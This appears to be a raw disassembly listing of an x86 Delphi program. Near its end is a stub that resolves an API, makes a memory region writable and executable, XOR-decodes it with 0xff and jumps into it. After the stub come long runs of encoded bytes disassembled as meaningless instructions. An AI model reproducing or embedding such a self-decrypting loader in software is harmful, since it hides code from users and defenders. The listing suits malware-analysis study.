mov eax [ ebp - 0xc ]
call sub_473e88
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x296 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
dec eax
sub al 0x2
jb r-xdata
cmp [ ebx + 0x3f2 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4c ]
sub [ edi + 0x8 ] eax
mov eax [ edi + 0x8 ]
sub eax [ ebp - 0x18 ]
sub eax 0x2
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x10 ]
sub edx 0x4
sub edx 0x4
sub eax edx
mov edx [ ebp - 0xc ]
imul [ edx + 0x18 ]
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fld [ r-xdata ]
fmulp st1
call sub_402990
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x60 ] esi
mov eax [ ebp - 0x10 ]
sub eax esi
sub eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov [ edi ] eax
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x6c ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
sub [ edi + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x60 ]
add esi [ ebp - 0x18 ]
add esi 0x4
mov eax [ ebp - 0xc ]
imul esi [ eax + 0x68 ]
add esi 0x8
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4c ]
add edx edx
add edx esi
mov eax [ ebx + 0x240 ]
call sub_46038c
mov esi eax
mov eax [ ebp - 0xc ]
fild [ eax + 0x54 ]
fmul [ r-xdata ]
mov eax [ ebx + 0x235 ]
sub eax [ ebx + 0x22d ]
sub eax esi
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fmulp st1
fld [ r-xdata ]
fmulp st1
call sub_402990
sar esi 0x1
jns r-xdata
jmp r-xdata
test esi esi
jle r-xdata
mov eax [ ebp - 0xc ]
push esi
lea esi [ eax + 0x34 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebp - 0xc ]
call sub_473b7c
mov edx eax
lea ecx [ ebp - 0x34 ]
mov eax [ ebx + 0x3f4 ]
call [ ebx + 0x3f0 ]
mov eax [ ebp - 0xc ]
push esi
lea edi [ eax + 0x34 ]
lea esi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ ebx + 0x248 ]
sub edx esi
add edx eax
mov [ edi ] edx
add esi [ ebx + 0x248 ]
add eax esi
mov [ edi + 0x8 ] eax
mov eax [ edi ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x60 ]
add eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
imul esi [ eax + 0x6c ]
adc esi 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_474208
pop ecx
mov eax [ ebx + 0x288 ]
mov edi [ eax + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
xor edx edx
mov eax edi
call sub_41d310
mov edx 0xffffff
mov eax edi
call sub_41d310
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x20 ]
mov edi [ ebp - 0x24 ]
sub edi esi
jl r-xdata
mov esi [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
mov edi [ eax + 0x20 ]
sub edi esi
jg r-xdata
xor edx edx
mov eax edi
call sub_41d40c
mov edx 0x1
mov eax edi
call sub_41d43c
mov eax ebx
call sub_4737c8
mov [ ebp - 0x1c ] eax
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46038c
mov edx [ ebp - 0xc ]
add eax [ edx + 0x20 ]
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
lea esi [ ebx + 0x28e ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
inc edi
dec edi
mov eax [ ebp - 0xc ]
mov al [ eax + 0xc ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax + 0xc ]
sub al 0x1
jb r-xdata
push ebp
mov eax [ ebp - 0xc ]
mov edx esi
sub edx [ eax + 0x20 ]
mov eax esi
call sub_473f78
pop ecx
inc esi
dec edi
jne r-xdata
push ebp
mov edx [ ebp - 0x24 ]
sub edx esi
mov eax esi
call sub_473f78
pop ecx
dec esi
inc edi
jne r-xdata
jmp r-xdata
push ebp
call sub_474424
pop ecx
add [ esi ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x3c ]
mov [ esi ] eax
jmp r-xdata
je r-xdata
mov eax ebx
call sub_4617c4
push ebp
call sub_474424
pop ecx
sub [ esi + 0x8 ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec al
je r-xdata
push ebp
call sub_474458
pop ecx
add [ esi + 0x4 ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0xc ]
add eax [ edx + 0x4c ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec al
je r-xdata
push ebp
call sub_474458
pop ecx
sub [ esi + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x38 ]
mov [ esi + 0xc ] eax
jmp r-xdata
sub_47499c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_474a29
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax esi
call sub_403ee8
push esi
mov cl [ ebx + 0x50 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xbc ]
test ebx ebx
jne r-xdata
mov eax esi
call j_sub_4043b4
mov [ eax + ebx - 0x1 ] 0x20
lea eax [ ebp - 0xc ]
mov edx [ rw-data ]
mov dl [ edx ]
call sub_4040d0
mov eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_40c6a4
mov ebx eax
test ebx ebx
jle r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474a30
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_474a38
push ebp
mov ebp esp
push ebx
push esi
push edi
or esi 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x6c ]
dec ecx
test ecx ecx
jl r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn
inc ecx
xor edx edx
inc edx
dec ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0xc ]
mov edi [ ebp + 0x8 ]
add eax [ edi - 0x8 ]
cmp ebx eax
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x38 ]
inc eax
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x8 ]
imul ebx edx
add eax ebx
mov ebx [ ebp + 0x8 ]
cmp eax [ ebx - 0xc ]
jg r-xdata
mov esi edx
jmp r-xdata
sub_474a90
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
or esi 0xffffffff
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412bb8
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
add eax 0x34
push eax
call PtInRect
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_473f64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x68 ]
test ecx ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x6c ]
test ecx ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x34 ]
cdq
idiv ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
call sub_473b7c
mov eax [ eax + 0x288 ]
call sub_45c9c4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x68 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
push ebp
call sub_474a38
pop ecx
mov esi eax
jmp r-xdata
inc edi
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec edi
jne r-xdata
add eax [ ebp - 0x14 ]
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
inc eax
mov edx [ ebp - 0x10 ]
imul edx [ ebp - 0x14 ]
add eax edx
cmp eax ebx
jg r-xdata
push ebp
call sub_474a38
pop ecx
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
imul esi
add eax [ ebp - 0x10 ]
mov esi eax
sub_474ba4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax edi
call sub_413794
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_413794
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov ebx eax
mov [ ebx + 0x4 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
lea eax [ ebp - 0x108 ]
mov edx [ ebp - 0x8 ]
mov ecx 0xff
call sub_404184
lea edx [ ebp - 0x108 ]
lea eax [ ebx + 0xc ]
mov cl 0x14
call sub_402a88
lea eax [ ebp - 0x108 ]
mov edx [ ebp + 0xc ]
mov ecx 0xff
call sub_404184
lea edx [ ebp - 0x108 ]
lea eax [ ebx + 0x21 ]
mov cl 0x14
call sub_402a88
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x38 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_413eec
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_474b90
cmp edi [ eax + 0x4 ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_474ca8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_474cf2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_474c90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474cf9
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_474d00
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_40d3ac
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ edi ]
call sub_474b90
call sub_403198
inc esi
dec ebx
jne r-xdata
sub_474d34
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038ec#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474d67
retn
call sub_474d00
sub_474d6c
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xor eax eax
push ebp
push sub_474ed0
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474ed7
lea eax [ ebp - 0x2c ]
mov edx 0x7
call sub_403f0c
retn
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x40080000
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
mov al [ r-xdata ]
mov [ rw-data ] al
mov al [ r-xdata ]
mov [ rw-data ] al
mov eax [ r-xdata ]
mov [ ebp - 0x10 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0xc ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_413804
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x14 ]
mov eax [ r-xdata ]
call sub_474ca8
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x18 ]
mov eax [ r-xdata ]
call sub_474ca8
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x1c ]
mov eax [ r-xdata ]
call sub_474ca8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_474ca8
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x24 ]
mov eax [ r-xdata ]
call sub_474ca8
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_474ca8
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x2c ]
mov eax [ r-xdata ]
call sub_474ca8
sub_474ee4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x51
inc edi
add [ eax ] ah
push eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
push eax
inc edi
add [ eax ] ah
add eax [ eax ]
add al bl
add [ ebp ] al
shl [ ecx + 0x2cf80041 ] 0x45
add [ esi + ebp + 0x33f40045 ] ch
inc eax
add [ eax ] bl
push ebx
inc ebp
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
adc al 0x2f
inc ebp
add [ eax + 0x18 ] dh
inc esp
add [ esp + esi + 0x46540045 ] al
inc ecx
add ah dl
xor [ ebp ] al
adc [ ecx ] dh
inc ebp
add [ edx + esi ] bl
inc ebp
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0x3a940041 ]
inc ebp
add [ eax + 0x3400419e ] bh
jbe r-xdata
add al 0xa6
inc ebx
add ah dl
cmp al [ ebp ]
lodsb [ esi ]
enter 0x43 0x8c
or eax [ eax + eax + 0x48 ]
or al 0x44
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ edx + ebp + 0x45 ] ch
add [ eax + 0x41 ] bh
inc ebp
add al bh
loope r-xdata
add [ ebx + ebp + 0x45 ] ch
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ edi + esi + 0x45 ] dh
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] ch
enter 0x43 0x40
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ edx + edi + 0x45 ] bl
add [ eax ] ch
cmp [ ebp ] eax
inc ebp
add [ esi + ecx * 2 ] bh
inc ebp
add [ ecx + edx * 2 + 0x50580045 ] bl
inc ebp
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
sbb [ ebx ] al
add [ eax ] al
or [ eax ] al
push es
jo r-xdata
inc ebp
add [ eax + 0x3a ] bl
inc ebp
add [ edx ] cl
add bl dl
push eax
inc edi
add ah dl
push edx
inc ebp
add ah dh
loopne r-xdata
nop
xor [ edx ] ecx
add [ eax ] al
0x971c0044 0x44
test al 0x9
js r-xdata
outsb
jne r-xdata
add al bh
add al [ eax ]
add [ eax ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
rcl [ eax + 0x47 ] cl
add [ edx + esi * 2 + 0x2d300045 ] bh
inc ebp
add al al
insd
inc ebp
add [ eax + 0x74004554 ] ah
outsd
add [ ebp + ecx + 0x44 ] ch
add al cl
pop ecx
inc ebp
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add ah bl
outsb
inc ebp
add [ eax + 0x24 ] ah
inc ebp
add [ eax ] dl
daa
inc ebp
add [ edi + ebx * 2 + 0x2ff80045 ] bh
inc ebp
add [ eax + esi + 0x45 ] dh
nop
nop
lea eax [ ebp - 0xc ]
push eax
push 0x40
push 0x5299
mov eax [ ebp - 0x4 ]
push eax
call [ ebp - 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
xor [ edi + ecx * 2 ] ebp
inc edi
add [ eax ] ah
add al [ ebp ]
pop esi
add [ 0x74696e55 ] al
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
nop
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov dl [ ebp - 0x9 ]
xor [ eax ] dl
mov esp ebp
pop ebp
retn
sbb al 0x3
add [ eax ] al
or [ eax ] eax
adc cl [ edi + 0x70 ]
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x631676f
push esp
inc esi
outsd
jb r-xdata
inc ebx
push 0x31747261
adc [ ebx ] al
add [ eax ] al
push es
add [ ebx ] cl
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] edx
add [ eax ] al
pop es
add al 0x0
pop es
inc edx
jne r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ ecx ] cl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x31756e65
add [ ebx ] al
add [ eax ] al
add al [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
nop
nop
mov cl 0xff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_475120
nop
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x529a
jne r-xdata
mov esp ebp
pop ebp
retn
inc edx
add [ eax ] bl
inc esp
add [ eax + 0x2 ] bl
inc edi
add [ ebx ] ah
inc edx
add [ ebp + 0x51040040 ] cl
inc edi
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
sbb eax [ ebx ]
mov [ edx ] ss
inc ebx
add ah ch
add [ ebx ] al
or al 0x99
je r-xdata
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x31831
add [ eax ] cl
add [ esi ] al
add eax [ eax ]
add [ edi ] al
or [ ebx ] al
add [ eax ] al
inc ebx
add [ ebx + ebx + 0x43 ] cl
add [ edx + edx + 0xec0043 ] cl
inc ebx
add [ ecx + ebx * 4 ] cl
outsb
xor [ ebx + eax ] ecx
add [ eax ] al
add eax 0x72470900
outsd
jne r-xdata
cdq
inc edx
outsd
sub_475120
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
nop
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov dl [ ebp - 0x9 ]
xor [ eax ] dl
mov esp ebp
pop ebp
retn
sub_475140
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
nop
nop
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_47516c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
nop
nop
lea eax [ ebp - 0xc ]
push eax
push 0x40
push 0x5299
mov eax [ ebp - 0x4 ]
push eax
call [ ebp - 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
nop
nop
mov cl 0xff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_475120
nop
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x529a
jne r-xdata
mov esp ebp
pop ebp
retn
sub_4751b4
push ebp
mov ebp esp
add esp 0xffffffec
nop
push r-xdata
call sub_4751b4
outsd
outsd
outsd
outsd
je r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ ebp - 0x8 ] eax
nop
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
call sub_47516c
mov eax [ ebp + 0x8 ]
add eax 0x213c
mov [ ebp - 0x4 ] eax
jmp [ ebp - 0x4 ]
jbe r-xdata
cdq
jbe r-xdata
nop
cmp [ ebp + 0x8 ] 0x0
je r-xdata
in al dx
retn
clc
xor eax eax
mov [ ebp - 0x10 ] eax
pcmpeqb mm5 [ edi ]
cdq
nop
nop
mov cl 0xff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_475120
nop
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x529a
jne r-xdata
mov esp ebp
pop ebp
retn
sub_475de4
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
stosb [ edi ]
push ss
imul esp edi 0xffffffff
[ edi + 0x6f ]
sub_476030
push ss
add ebp 0x6f6fffff
outsd
outsd
outsd
stosb [ edi ]
je r-xdata
outsd
outsd
push ss
dec esp
add eax 0x746f0000
push es
push ss
jmp r-xdata
jl r-xdata
std
scasd [ edi ]
jb r-xdata
aaa
add al [ eax ]
add [ edi + 0x7497a900 ] ch
mov edx 0x163cc4f3
ja r-xdata
add [ eax ] al
scasd [ edi ]
add [ ecx - 0xc458b69 ] ch
les edi [ esi + edx ]
sub_476092
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
je r-xdata
idiv edi
push ss
clc
not [ esi ]
adc eax 0x6f00000e
outsd
outsd
push ss
0x6f000004 0x6f6f
sub_476310
push cs
add [ eax ] al
outsd
outsd
outsd
jpe r-xdata
push ss
dec esp
aam 0xff
[ edi - 0x52 ]
push ss
cmp eax 0xf0ffffdc
dec eax
std
push ss
das
aam 0xff
[ edi + 0x6f ]
sub_476971
cdq
jbe r-xdata
pop ebp
je r-xdata
jpo r-xdata
cdq
jbe r-xdata
pop ss
[ edi + 0x6f ]
pop ebx
movsb [ edi ] [ esi ]
xchg ebp eax
mov ebx [ ecx + 0x1659a276 ]
mov al [ 0x6f00000d ]
outsd
outsd
outsd
outsd
outsd
jb r-xdata
outsd
mov ecx 0x7df00fc4
inc edx
in eax dx
pop esi
idiv edi
jmp [ esi + 0x7bf03f7a ]
mov [ 0x173974af ] eax
sub_47708e
jb r-xdata
outsd
outsd
outsd
outsd
outsd
push ss
pushad
cld
jae r-xdata
pop ss
mov gs ax
add [ eax ] al
sub_4770a8
adc eax 0x746f0000
and [ esp + eax ] ch
jl r-xdata
pop ss
dec ebp
out 0xff eax
call [ esi ]
push ds
call 0x7c3870f6
dec esp
cmc
idiv [ ebp + 0x5ceaa377 ]
jl r-xdata
fcomip st0
jge r-xdata
outsd
outsd
outsd
outsd
push ss
pushad
cld
int3
sub_47726b
inc esp
and eax esi
jae r-xdata
movsd [ edi ] [ esi ]
xchg ebp eax
mov eax 0xffd33716
add [ eax ] al
add [ esi ] dl
or ax 0x0
outsd
outsd
outsd
movsd [ edi ] [ esi ]
xchg ebp eax
pushfd
push ss
push cs
add [ eax ] al
outsd
outsd
outsd
cdq
jbe r-xdata
push ss
pop ebp
hlt
cdq
jbe r-xdata
outsd
outsd
test al 0x40
sar ebp cl
[ edi + 0x6f ]
imul esp [ eax - 0x6a5a786b ] 0xffffffb8
push ss
aaa
sar edi cl
sub_477333
push ss
mov ebx 0x6ffffff0
outsd
outsd
outsd
stosb [ edi ]
je r-xdata
int3
jl r-xdata
lodsb [ esi ]
add dl ch
push ebx
pop es
jle r-xdata
jpe r-xdata
imul edi ebx 0xffffffff
[ ecx + ebp * 4 + 0x79117a8 ]
call [ esi ]
scasb [ edi ]
add eax [ eax ]
add [ eax + eax - 0xac16 ] ch
call [ esi ]
fild [ 0x9cc0000 ]
les edi [ eax + esi * 8 ]
jns r-xdata
[ edi + 0x6f ]
in al 0xff
call [ esi ]
inc edi
add [ eax ] al
add al dh
jpe r-xdata
pop ss
xchg ecx eax
pop es
add [ eax ] al
je r-xdata
loopne r-xdata
sub_477aee
test eax 0xdcf17
add [ esi - 0x3ae9c086 ] ah
add [ eax ] al
add [ edi + 0x6f ] ch
outsd
outsd
mov ss [ esi ]
jb r-xdata
pop ds
movsb [ edi ] [ esi ]
xchg ebp eax
leave
cdq
jbe r-xdata
add [ edi - 0x10 ] ch
jpo r-xdata
add [ eax ] al
outsd
outsd
cdq
jpe r-xdata
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
jl r-xdata
pop ss
mov al [ 0x7699cb95 ]
stosb [ edi ]
rcr [ ecx - 0x5fea7d8a ] cl
xchg ebp eax
xchg ebx eax
movsd [ edi ] [ esi ]
cdq
jbe r-xdata
add [ eax ] eax
add [ edx - 0x46 ] dh
out dx eax
jbe r-xdata
outsd
xchg ebp eax
add [ edi + 0x150316 ] ch
add [ edi + 0x6f ] ch
outsd
outsd
outsd
outsd
outsd
outsd
cdq
jbe r-xdata
outsd
pop ss
dec ecx
int1
std
int3
add edx [ esi ]
cmp [ edx ] ah
add [ eax ] al
outsd
outsd
mov [ 0x6f6f6f3c ] al
rcr [ ecx - 0x6a30558a ] 0x1
xchg [ ebp - 0x32558967 ] ah
xchg ebp eax
fwait
movsd [ edi ] [ esi ]
cdq
jbe r-xdata
test eax 0xfffa1b17
call [ esi ]
idiv edi
[ edi + 0x6f ]

sub_477b93
push ss
or [ eax + eax ] 0x0
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
jpe r-xdata
pop ss
add bl [ eax + eax ]
add [ ebx + edi - 0xd ] bh
retn 0x159f
push ss
jmp r-xdata
cdq
jbe r-xdata
outsd
outsd
outsd
je r-xdata
cdq
jbe r-xdata
rcr [ ecx - 0x5fea7d8a ] cl
xchg ebp eax
xchg ebx eax
movsd [ edi ] [ esi ]
cdq
jbe r-xdata
out 0xa7 eax
push ss
pop esi
sbb al [ eax ]
add [ esi + 0x6f6f6f3c ] ah
outsd
outsd
outsd
outsd
outsd
add [ eax - 0x46b70f1d ] ch
stc
push ss
imul ebx ebx 0xffffffff
[ edi + 0x6f ]
add edx [ esi ]
cmp [ edx ] ah
add [ eax ] al
outsd
outsd
mov [ 0x6f6f6f3c ] al
outsd
pop ss
dec ecx
int1
rcr [ ecx - 0x6a30558a ] 0x1
xchg [ ebp - 0x32558967 ] ah
xchg ebp eax
fwait
movsd [ edi ] [ esi ]
cdq
jbe r-xdata

sub_4780ab
mov edx 0x16afae03
pop es
sldt [ eax ]
outsd
cdq
jl r-xdata
mov [ esi ] cs
add [ eax ] al
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
outsd
jpe r-xdata
[ ecx + 0x2d4316 ]
sub_47814b
jmp r-xdata
jbe r-xdata
inc ebp
xchg ebp eax
mov dl [ esi ]
add edx [ eax + eax ]
add [ edi + 0x6f ] ch
outsd
scasd [ edi ]
je r-xdata
mov [ 0x17c58ea ] eax
fcomip st0
jge r-xdata
pop ss
sldt [ eax ]
cmpsb [ esi ] [ edi ]
jpe r-xdata
sbb [ eax ] eax
